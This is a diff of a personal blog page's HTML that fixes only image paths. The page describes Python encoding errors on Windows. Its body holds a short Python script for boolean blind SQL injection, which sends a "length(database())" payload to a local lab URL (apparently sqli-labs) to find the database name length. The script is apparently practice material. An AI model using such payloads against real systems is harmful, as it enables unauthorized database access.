@@ -29,12 +29,12 @@
 <meta property="og:site_name" content="WJW&#39;s Blog">
 <meta property="og:description" content="在windows环境下运行python脚本出现中文错误的解决办法：*原因：中文windows默认的输出编码为gbk，与脚本中定义的UTF-8不一样，所以出现了解码失败的情况。方法一：先把中文解码为utf-8然后再转化为gbk输出。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/.com//1.png">
+<meta property="og:image" content="http://example.com/2021/01/16/python/python.md/1.png">
 <meta property="article:published_time" content="2021-01-16T12:33:23.000Z">
 <meta property="article:modified_time" content="2021-07-27T01:54:26.591Z">
 <meta property="article:author" content="WJW">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/.com//1.png">
+<meta name="twitter:image" content="http://example.com/2021/01/16/python/python.md/1.png">
 
 <link rel="canonical" href="http://example.com/2021/01/16/python/">
 
@@ -265,7 +265,7 @@
 <p><code># -*- coding:utf-8 -*-</code><br>import requests</p>
 <p>def ascii_str():#生成库名表名字符所在的字符列表字典<br>    str_list=[]<br>    for i in range(33,127):#所有可显示字符<br>        str_list.append(chr(i))<br>    print(‘可显示字符：%s’%str_list)<br>    return str_list#返回字符列表</p>
 <p>def db_length(url,str):<br>    print(“[-]开始测试数据库名长度…….”)<br>    num=1<br>    while True:<br>        db_payload=url+”‘ and (length(database())=%d)–+”%num<br>        r=requests.get(db_payload)<br>        if str in r.text:<br>            db_length=num<br>            print(“[+]数据库长度：%d\n”%db_length)<br>            break<br>        else:<br>            num += 1</p>
-<p><code>if __name__ == &#39;__main__&#39;:</code><br>    url=”<a target="_blank" rel="noopener" href="http://localhost1/Less-5/?id=1&quot;#%E7%9B%AE%E6%A0%87url">http://localhost1/Less-5/?id=1&quot;#目标url</a><br>    str=”You are in”#布尔型盲注的true&amp;false的判断因素<br>    db_length(url,str)#程序入口`<br><img src="/.com//1.png"></p>
+<p><code>if __name__ == &#39;__main__&#39;:</code><br>    url=”<a target="_blank" rel="noopener" href="http://localhost1/Less-5/?id=1&quot;#%E7%9B%AE%E6%A0%87url">http://localhost1/Less-5/?id=1&quot;#目标url</a><br>    str=”You are in”#布尔型盲注的true&amp;false的判断因素<br>    db_length(url,str)#程序入口`<br><img src="python.md/1.png"></p>
 
     </div>
 
